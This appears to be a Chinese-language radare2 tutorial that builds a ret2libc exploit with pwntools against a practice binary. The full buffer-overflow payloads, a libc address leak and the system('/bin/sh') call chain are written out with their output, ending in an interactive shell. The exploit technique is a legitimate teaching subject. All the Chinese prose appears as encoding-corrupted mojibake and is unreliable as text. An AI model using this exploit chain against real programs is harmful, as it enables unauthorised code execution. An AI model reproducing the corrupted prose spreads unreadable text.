ç¼–å†™è„šæœ¬æˆ‘ä»¬éœ€è¦ä½¿ç”¨[_pwnlib_](https://github.com/Gallopsled/pwntools)æ¡†æ¶ï¼Œè€Œä¸”å®ƒæ˜¯æˆ‘æœ€å–œæ¬¢çš„ python æ¼æ´åˆ©ç”¨æ¡†æ¶ã€‚ä»–ç®€åŒ–äº†å¾ˆå¤šä¸œè¥¿ï¼Œè®©åˆ©ç”¨æ›´ç®€ä¾¿ã€‚å½“ç„¶ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–ä½ å–œæ¬¢çš„æ–¹å¼ã€‚

ä½¿ç”¨`pip`ä¸‹è½½*pwntools*ï¼š

```shell
$ pip install --upgrade pip
$ pip install --upgrade pwntools
```

ä½ å¯ä»¥åœ¨[å®˜æ–¹æ–‡æ¡£](http://docs.pwntools.com/en/stable/index.html)ä¸Šäº†è§£æ›´å¤šå…³äº*pwntools*ã€‚

è¿™æ˜¯æˆ‘ä»¬ç¬¬ä¸€é˜¶æ®µçš„ python è„šæœ¬ï¼š

```python
from pwn import *

# Addresses
puts_plt =
puts_got =
entry_point =

# context.log_level = "debug"

def main():

    # open process
    p = process("./megabeets_0x2")

    # Stage 1

    # Initial payload
    payload  =  "A"*140 # padding
    ropchain =  p32(puts_plt)
    ropchain += p32(entry_point)
    ropchain += p32(puts_got)

    payload = payload + ropchain

    p.clean()
    p.sendline(payload)

    # Take 4 bytes of the output
    leak = p.recv(4)
    leak = u32(leak)
    log.info("puts is at: 0x%x" % leak)
    p.clean()


if __name__ == "__main__":
    main()
```

æˆ‘ä»¬éœ€è¦å¡«å……`puts@plt`å’Œ`puts@got`çš„åœ°å€ï¼Œä»¥åŠç¨‹åºçš„å…¥å£ç‚¹ã€‚è®©æˆ‘ä»¬å›åˆ°`radare2`å¹¶æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ã€‚å­—ç¬¦`#`ç”¨äºæ³¨é‡Šï¼Œå­—ç¬¦`~`æ˜¯`radare2`çš„ shell ä¸­çš„å†…ç½®`grep`ã€‚

```shell
[0xf7763b30]> # the address of puts@plt:
[0xf7763b30]> ?v sym.imp.puts
0x08048390
[0xf7763b30]> # the address of puts@got:
[0xf7763b30]> ?v reloc.puts_20
0x0804a014
[0xf7763b30]> # the address of programâ€™s entry point (entry0):
[0xf7763b30]> ieq
0x080483d0
```

`sym.imp.puts`å’Œ`reloc.puts_20`æ˜¯`radare2`è‡ªåŠ¨æ£€æµ‹åˆ°çš„æ ‡å¿—ã€‚å‘½ä»¤`ie`è¡¨ç¤º`Information Entrypoint`ã€‚

ç°åœ¨æˆ‘ä»¬å¡«å…¥æˆ‘ä»¬æ‰¾åˆ°çš„åœ°å€ï¼š

```python
...

# Addresses
puts_plt = 0x8048390
puts_got = 0x804a014
entry_point = 0x80483d0

...
```

æˆ‘ä»¬æ‰§è¡Œä¸€ä¸‹è„šæœ¬ï¼š

```shell
$ python exploit.py
[+] Starting local process â€˜./megabeets_0x2â€™: pid 23578
[*] puts is at: 0xf75db710
[*] Stopped process â€˜./megabeets_0x2â€™ (pid 23578)

$ python exploit.py
[+] Starting local process â€˜./megabeets_0x2â€™: pid 23592
[*] puts is at: 0xf7563710
[*] Stopped process â€˜./megabeets_0x2â€™ (pid 23592)

$ python exploit.py
[+] Starting local process â€˜./megabeets_0x2â€™: pid 23606
[*] puts is at: 0xf75e3710
[*] Stopped process â€˜./megabeets_0x2â€™ (pid 23606)
```

æˆ‘æ‰§è¡Œäº†è„šæœ¬ä¸‰æ¬¡ï¼Œ`puts`çš„åœ°å€æ¯æ¬¡éƒ½ä¼šå˜å¾—ä¸ä¸€æ ·ã€‚å› æ­¤æˆ‘ä»¬ä¸èƒ½æå‰é¢„æµ‹å®ƒçš„åœ°å€ã€‚ç°åœ¨æˆ‘ä»¬éœ€è¦æ‰¾åˆ°`puts`åœ¨*libc*ä¸­çš„åç§»ï¼Œç„¶åè®¡ç®—å‡º*libc*çš„åŸºå€ã€‚åœ¨æˆ‘ä»¬æ‰¾åˆ°åŸºå€åï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åç§»è®¡ç®—å‡º`system`ã€`exit`ä»¥åŠå­—ç¬¦ä¸²`/bin/sh`çš„åœ°å€ã€‚

ç°åœ¨æˆ‘ä»¬çš„è„šæœ¬åº”è¯¥æ˜¯è¿™æ ·ï¼š

```python
from pwn import *

# Addresses
puts_plt = 0x8048390
puts_got = 0x804a014
entry_point = 0x80483d0

# Offsets
offset_puts =
offset_system =
offset_str_bin_sh =
offset_exit =

# context.log_level = "debug"

def main():

    # open process
    p = process("./megabeets_0x2")

    # Stage 1

    # Initial payload
    payload  =  "A"*140
    ropchain =  p32(puts_plt)
    ropchain += p32(entry_point)
    ropchain += p32(puts_got)

    payload = payload + ropchain

    p.clean()
    p.sendline(payload)

    # Take 4 bytes of the output
    leak = p.recv(4)
    leak = u32(leak)
    log.info("puts is at: 0x%x" % leak)

    p.clean()

    # Calculate libc base

    libc_base = leak - offset_puts
    log.info("libc base: 0x%x" % libc_base)

    # Stage 2

    # Calculate offsets
    system_addr = libc_base + offset_system
    binsh_addr = libc_base + offset_str_bin_sh
    exit_addr = libc_base  + offset_exit

    log.info("system: 0x%x" % system_addr)
    log.info("binsh: 0x%x" % binsh_addr)
    log.info("exit: 0x%x" % exit_addr)

if __name__ == "__main__":
    main()
```

## è®¡ç®—çœŸå®åœ°å€

_è¯·æ³¨æ„åœ¨æ–‡ç« çš„è¿™éƒ¨åˆ†ï¼Œæˆ‘çš„ç»“æœå¯èƒ½ä¸ä½ çš„ä¸åŒã€‚å› ä¸ºæˆ‘ä»¬çš„ libc ç‰ˆæœ¬ä¸åŒï¼Œæ‰€ä»¥ä¼šäº§ç”Ÿä¸åŒçš„åç§»ã€‚_

é¦–å…ˆæˆ‘ä»¬éœ€è¦æ‰¾åˆ°`puts`åœ¨*libc*ä¸Šçš„åç§»ã€‚æˆ‘ä»¬å†ä¸€æ¬¡æ‰“å¼€`radare2`ï¼Œç»§ç»­æ‰§è¡Œåˆ°å…¥å£ç‚¹ã€‚åšä»¥ä¸Šæ­¥éª¤çš„åŸå› æ˜¯æˆ‘ä»¬åœ¨*libc*è½½å…¥ä¹‹å‰å¼€å§‹è°ƒè¯•ç¨‹åºï¼Œç›´åˆ°å…¥å£ç‚¹æ—¶ï¼Œè¿è¡Œåº“æ‰å…¨éƒ¨åŠ è½½å®Œã€‚

æˆ‘ä»¬ä½¿ç”¨`dmi`å‘½ä»¤ï¼Œå°†*libc*å’Œå‡½æ•°ä½œä¸ºå‚æ•°ã€‚æˆ‘åŠ ä¸Šäº†`~`æ¥æ˜¾ç¤ºç›¸å…³çš„ä¿¡æ¯ã€‚

```shell
$ r2 -d megabeets_0x2
Process with PID 24124 startedâ€¦
= attach 24124 24124
bin.baddr 0x08048000
Using 0x8048000
Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2
asm.bits 32
â€” A C program is like a fast dance on a newly waxed dance floor by people carrying razors â€“ Waldi Ravens

[0xf771ab30]> dcu entry0
Continue until 0x080483d0 using 1 bpsize
hit breakpoint at: 80483d0

[0x080483d0]> dmi libc puts~ puts$
vaddr=0xf758f710 paddr=0x00062710 ord=6490 fwd=NONE sz=474 bind=GLOBAL type=FUNC name=puts

[0x080483d0]> dmi libc system~ system$
vaddr=0xf7569060 paddr=0x0003c060 ord=6717 fwd=NONE sz=55 bind=WEAK type=FUNC name=system

[0x080483d0]> dmi libc exit~ exit$
vaddr=0xf755c180 paddr=0x0002f180 ord=5904 fwd=NONE sz=33 bind=LOCAL type=FUNC name=exit
```

_è¯·æ³¨æ„ï¼Œåœ¨è¿™ç¯‡æ–‡ç« å‘è¡¨å‰ï¼Œ`dmi`çš„è¾“å‡ºæ ¼å¼å°±å·²ç»æ”¹å˜äº†ã€‚ä½ çš„ç»“æœå¾ˆæœ‰å¯èƒ½ä¸æˆ‘çš„æœ‰æ‰€ä¸åŒã€‚_

æ‰€æœ‰è¿™äº›`paddr=0x000xxxxx`æ˜¯å‡½æ•°åœ¨*libc*ä¸Šçš„åç§»ã€‚ç°åœ¨æˆ‘ä»¬éœ€è¦åœ¨ç¨‹åºä¸­æ‰¾åˆ°`/bin/sh`çš„ä½ç½®ã€‚æˆ‘ä»¬å°†è¦ä½¿ç”¨`radare2`çš„ä¸€äº›æœç´¢åŠŸèƒ½ã€‚`radare2`é»˜è®¤åœ¨`dbg.map`ï¼Œä¹Ÿå°±æ˜¯å½“å‰å†…å­˜ä¸­æŸ¥æ‰¾ã€‚æˆ‘ä»¬æƒ³è¦åœ¨æ‰€æœ‰å†…å­˜ä¸­æŸ¥æ‰¾åˆ™éœ€è¦è®¾ç½®æˆï¼š

```shell
[0x080483d0]> e search.in = dbg.maps
```

ä½ å¯ä»¥æ‰§è¡Œ`e search.in=?`æŸ¥çœ‹æ›´å¤šé€‰é¡¹ã€‚æ‰§è¡Œ`Ve`é…ç½®å¯è§†åŒ–æ¨¡å¼

åœ¨`radare2`ä¸­é€šè¿‡`/`å‘½ä»¤æŸ¥æ‰¾ã€‚è®©æˆ‘ä»¬çœ‹çœ‹`radare2`ç»™æˆ‘ä»¬æä¾›çš„æŸ¥æ‰¾å‚æ•°ï¼š

```shell
|Usage: /[amx/] [arg]Search stuff (see â€˜e??searchâ€™ for options)
| / foo\x00           search for string â€˜foo\0â€™
| /j foo\x00          search for string â€˜foo\0â€™ (json output)
| /! ff               search for first occurrence not matching
| /+ /bin/sh          construct the string with chunks
| /!x 00              inverse hexa search (find first byte != 0x00)
| //                  repeat last search
| /h[t] [hash] [len]  find block matching this hash. See /#?
| /a jmp eax          assemble opcode and search its bytes
| /A jmp              find analyzed instructions of this type (/A? for help)
| /b                  search backwards
| /B                  search recognized RBin headers
| /c jmp [esp]        search for asm code
| /C[ar]              search for crypto materials
| /d 101112           search for a deltified sequence of bytes
| /e /E.F/i           match regular expression
| /E esil-expr        offset matching given esil expressions %%= here
| /f file [off] [sz]  search contents of file with offset and size
| /i foo              search for string â€˜fooâ€™ ignoring case
| /m magicfile        search for matching magic file (use blocksize)
| /o                  show offset of previous instruction
| /p patternsize      search for pattern of given size
| /P patternsize      search similar blocks
| /r[e] sym.printf    analyze opcode reference an offset (/re for esil)
| /R [?] [grepopcode] search for matching ROP gadgets, semicolon-separated
| /v[1248] value      look for an cfg.bigendian 32bit value
| /V[1248] min max    look for an cfg.bigendian 32bit value in range
| /w foo              search for wide string â€˜f\0o\0o\0â€™
| /wi foo             search for wide string ignoring case â€˜f\0o\0o\0â€™
| /x ff..33           search for hex string ignoring some nibbles
| /x ff0033           search for hex string
| /x ff43 ffd0        search for hexpair with mask
| /z min max          search for strings of given size
```

æä¾›ç»™æˆ‘ä»¬äº†è®¸å¤šä¸åŒçš„æ–¹å¼ã€‚åŒæ—¶è¿˜å‘å¿ƒ`/R`èƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬æŸ¥æ‰¾ ROPã€‚å¯æƒœè¿™ç¯‡æ–‡ç« é‡Œæˆ‘ä»¬æ²¡æœ‰æ‰“ç®—ä½¿ç”¨ ROPã€‚ä½†å…¶ä»–æƒ…å†µä¸‹ï¼Œä½ ä»¬å†™åˆ©ç”¨è„šæœ¬æ—¶ä¸€å®šå¾ˆå–œæ¬¢ç”¨å®ƒã€‚

æˆ‘ä»¬ä¸éœ€è¦ä»»ä½•èŠ±å“¨çš„ä¸œè¥¿ï¼Œåªç”¨æœ€ç®€å•çš„æŸ¥æ‰¾å³å¯ã€‚åœ¨è¿™ä¹‹åï¼Œæˆ‘ä»¬å…ˆæ‰¾åˆ°å½“å‰*libc*è½½å…¥çš„åœ°å€ï¼Œç„¶åè®¡ç®—å‡º`/bin/sh`çš„åç§»ã€‚

```shell
[0x080483d0]> / /bin/sh
Searching 7 bytes from 0x08048000 to 0xffd50000: 2f 62 69 6e 2f 73 68
Searching 7 bytes in [0x8048000-0x8049000]
hits: 0
Searching 7 bytes in [0x8049000-0x804a000]
hits: 0 <..truncated..> Searching 7 bytes in [0xf77aa000-0xf77ab000]
hits: 0
Searching 7 bytes in [0xffd2f000-0xffd50000]
hits: 0
0xf7700768 hit1_0 .b/strtod_l.c-c/bin/shexit 0canonica.
```

`r2`åœ¨å†…å­˜ä¸­æ‰¾åˆ°äº†`/bin/sh`ã€‚ç°åœ¨æˆ‘ä»¬è®¡ç®—å®ƒç›¸å¯¹*libc*åŸºå€çš„åç§»ï¼š

```shell
[0x080483d0]> dmm~libc
0xf7599000 /usr/lib32/libc-2.25.so
[0x080483d0]> ?X 0xf7700768-0xf7599000
167768
```

æˆ‘ä»¬å‘ç°`/bin/sh`ç›¸å¯¹*libc*åŸºå€çš„åç§»ä¸º`0x167768`ã€‚æˆ‘ä»¬æŠŠå®ƒå¡«è¿›è„šæœ¬ä¸­ï¼Œå¹¶ä¸”å¯ä»¥å¼€å§‹æˆ‘ä»¬çš„æœ€åä¸€ä¸ªæ­¥éª¤ã€‚

```python
...

# Offsets
offset_puts = 0x00062710
offset_system = 0x0003c060
offset_exit = 0x0002f1b0
offset_str_bin_sh = 0x167768

...
```

## è·å– shell

æ¼æ´åˆ©ç”¨çš„ç¬¬äºŒé˜¶æ®µå¾ˆç›´æ¥ã€‚æˆ‘ä»¬ç»§ç»­ä½¿ç”¨ 140 ä¸ªå­—ç¬¦ï¼Œç„¶åè°ƒç”¨`system`å¹¶å°†`/bin/sh`ä½œä¸ºå‚æ•°ï¼Œæœ€å`exit`ã€‚

```
+---------------------+
|       Stage 2       |
+---------------------+
| padding (140 bytes) |
| system@libc         |
| exit@libc           |
| /bin/sh address     |
+---------------------+
```

è¿˜è®°å¾—ä¸Šä¸€æ¬¡æˆ‘ä»¬è¿”å›åˆ°äº†å…¥å£ç‚¹å—ï¼Ÿè¿™æ„å‘³ç€`scanf`åˆåœ¨ç­‰å¾…æˆ‘ä»¬çš„è¾“å…¥ã€‚ç°åœ¨æˆ‘ä»¬æ‰€åšçš„å°±æ˜¯æŠŠè¿™äº›è°ƒç”¨ä¸²è”èµ·æ¥ä¼ ç»™ç¨‹åºã€‚

è¿™æ˜¯æˆ‘ä»¬æœ€åçš„è„šæœ¬ã€‚åƒæˆ‘ä¹‹å‰æ‰€è¯´çš„ï¼Œä½ åªéœ€è¦æ›¿æ¢ç¬¦åˆä½ çš„*libc*çš„åç§»ã€‚

```python
from pwn import *

# Addresses
puts_plt = 0x8048390
puts_got = 0x804a014
entry_point = 0x80483d0

# Offsets
offset_puts = 0x00062710
offset_system = 0x0003c060
offset_exit = 0x0002f1b0
offset_str_bin_sh = 0x167768

# context.log_level = "debug"

def main():

    # open process
    p = process("./megabeets_0x2")

    # Stage 1

    # Initial payload
    payload  =  "A"*140
    ropchain =  p32(puts_plt)
    ropchain += p32(entry_point)
    ropchain += p32(puts_got)

    payload = payload + ropchain

    p.clean()
    p.sendline(payload)

    # Take 4 bytes of the output
    leak = p.recv(4)
    leak = u32(leak)
    log.info("puts is at: 0x%x" % leak)
    p.clean()

    # Calculate libc base
    libc_base = leak - offset_puts
    log.info("libc base: 0x%x" % libc_base)

    # Stage 2

    # Calculate offsets
    system_addr = libc_base + offset_system
    exit_addr = libc_base  + offset_exit
    binsh_addr = libc_base + offset_str_bin_sh

    log.info("system is at: 0x%x" % system_addr)
    log.info("/bin/sh is at: 0x%x" % binsh_addr)
    log.info("exit is at: 0x%x" % exit_addr)

    # Build 2nd payload
    payload2  =  "A"*140
    ropchain2 =  p32(system_addr)
    ropchain2 += p32(exit_addr)
    # Optional: Fix disallowed character by scanf by using p32(binsh_addr+5)
    #           Then you'll execute system("sh")
    ropchain2 += p32(binsh_addr)

    payload2 = payload2 + ropchain2
    p.sendline(payload2)

    log.success("Here comes the shell!")

    p.clean()
    p.interactive()

if __name__ == "__main__":
    main()
```

è·‘è¿™ä¸ªè„šæœ¬æˆ‘ä»¬å°±èƒ½æˆåŠŸæ‹¿åˆ°ä¸€ä¸ª shellï¼š

```shell
$ python exploit.py
[+] Starting local process â€˜./megabeets_0x2â€™: pid 24410
[*] puts is at: 0xf75db710
[*] libc base: 0xf75ce000
[*] system is at: 0xf760a060
[*] /bin/sh is at: 0xf7735768
[*] exit is at: 0xf75fd1b0
[+] Here comes the shell!
[*] Switching to interactive mode:

$ whoami
beet
$ echo EOF
EOF
```

# åè®°

`Radare2`ä¹‹æ—…çš„ç¬¬äºŒéƒ¨åˆ†å°±åˆ°æ­¤ç»“æŸäº†ã€‚æˆ‘ä»¬ç®€å•åœ°å­¦ä¹ äº†ä¸€äº›`radare2`ä¸­æ¼æ´åˆ©ç”¨çš„åŠŸèƒ½ã€‚åœ¨ä¸‹ä¸€éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬ä¼šå­¦ä¹ `radare2`å†è„šæœ¬ç¼–å†™å’Œæ¶æ„è½¯ä»¶åˆ†æä¸­çš„åŠŸèƒ½ã€‚

# æ¼æ´åˆ©ç”¨å‘½ä»¤å¯¹åº”è¡¨

è¿™æ˜¯ä¸€ç³»åˆ—æˆ‘åœ¨æœ¬æ–‡ä¸­æåˆ°çš„å‘½ä»¤ï¼ˆè¿˜æœ‰ä¸€äº›è¡¥å……ï¼‰ã€‚ä½ å¯ä»¥æŠŠå®ƒä½œä¸ºä¸€ä»½å‚è€ƒè¡¨ã€‚

## è·å–ä¿¡æ¯

- `$ rabin2 -I ./program`â€”â€”äºŒè¿›åˆ¶ä¿¡æ¯ï¼ˆå’Œ`radare2`çš„ shell ä¸­`i`å‘½ä»¤ç›¸åŒï¼‰
- `ii [q]`â€”â€”å¯¼å…¥è¡¨
- `?v sym.imp.func_name`â€”â€”è·å–`func_name@PLT`åœ°å€
- `?v reloc.func_name`â€”â€”è·å–`func_name@GOT`åœ°å€
- `ie [q]`â€”â€”è·å–å…¥å£ç‚¹åœ°å€
- `iS`â€”â€”æŸ¥çœ‹åŒºæ®µçš„å„ä¸ªæƒé™ï¼ˆè¯»/å†™/æ‰§è¡Œï¼‰
- `i~canary`â€”â€”æ£€æŸ¥æ˜¯å¦å¼€å¯`Canary`
- `i~pic`â€”â€”æ£€æŸ¥æ˜¯å¦å¼€å¯`PIE`
- `i~nx`â€”â€”æ£€æŸ¥æ˜¯å¦å¼€å¯`NX`

## å†…å­˜

- `dm`â€”â€”æŸ¥çœ‹å†…å­˜ä¿¡æ¯
- `dmm`â€”â€”åˆ—å‡ºæ¨¡å—ï¼ˆå†…å­˜ä¸­çš„è¿è¡Œåº“å’ŒäºŒè¿›åˆ¶æ¨¡å—ï¼‰
- `dmi [addr|libname] [symname]`â€”â€”åˆ—å‡ºç›®æ ‡åº“çš„æ ‡å¿—

## æŸ¥æ‰¾

- `e search.*`â€”â€”ç¼–è¾‘æŸ¥æ‰¾é…ç½®
- `/?`â€”â€”åˆ—å‡ºæŸ¥æ‰¾çš„å­å‘½ä»¤
- `/ string`â€”â€”åœ¨å†…å­˜æˆ–ç¨‹åºæ®µæŸ¥æ‰¾å­—ç¬¦ä¸²
- `/R [?]`â€”â€”æŸ¥æ‰¾ç‰¹å®šçš„ ROP
- `/R/`â€”â€”ROP å¸¸è§„æœç´¢

## è°ƒè¯•

- `dc`â€”â€”ç»§ç»­æ‰§è¡Œ
- `dcu addr`â€”â€”ç»§ç»­æ‰§è¡Œåˆ°æŸä¸ªåœ°å€
- `dcr`â€”â€”ç»§ç»­æ‰§è¡Œç›´åˆ°`ret`ï¼ˆå•æ­¥æ­¥è¿‡ï¼‰
- `dbt [?]`â€”â€”åœ¨*dbg.btdepth*å’Œ*dbg.btalgo*çš„åŸºç¡€ä¸Šå›æº¯æŒ‡ä»¤
- `doo [args]`â€”â€”é‡æ–°æ‰“å¼€è°ƒè¯•å¹¶è®¾ç½®å‚æ•°
- `ds`â€”â€”å•æ­¥æ­¥å…¥
- `dso`â€”â€”å•æ­¥æ­¥è¿‡

## å›¾å½¢æ¨¡å¼

- `pdf @ addr`â€”â€”è¾“å‡ºå½“å‰ä½ç§»ä¸‹å‡½æ•°çš„æ±‡ç¼–ä»£ç 
- `V`â€”â€”å¯è§†åŒ–æ¨¡å¼ï¼Œä½¿ç”¨`p`/`P`å†ä¸¤ä¸ªæ¨¡å¼é—´åˆ‡æ¢
- `VV`â€”â€”å›¾å½¢æ¨¡å¼ï¼Œåœ¨ ascii å›¾åƒä¸‹åˆ†æ
- `V!`â€”â€”æ§åˆ¶æ¿æ¨¡å¼ï¼Œå¯¹æ¼æ´åˆ©ç”¨éå¸¸æœ‰ç”¨

çœ‹çœ‹[è¿™ç¯‡æ–‡ç« ](http://radare.today/posts/using-radare2/)ï¼Œä¹Ÿè®¸æœ‰æ›´å¤šçš„å†…å®¹èƒ½å¤Ÿå¸®åŠ©åˆ°ä½ ã€‚
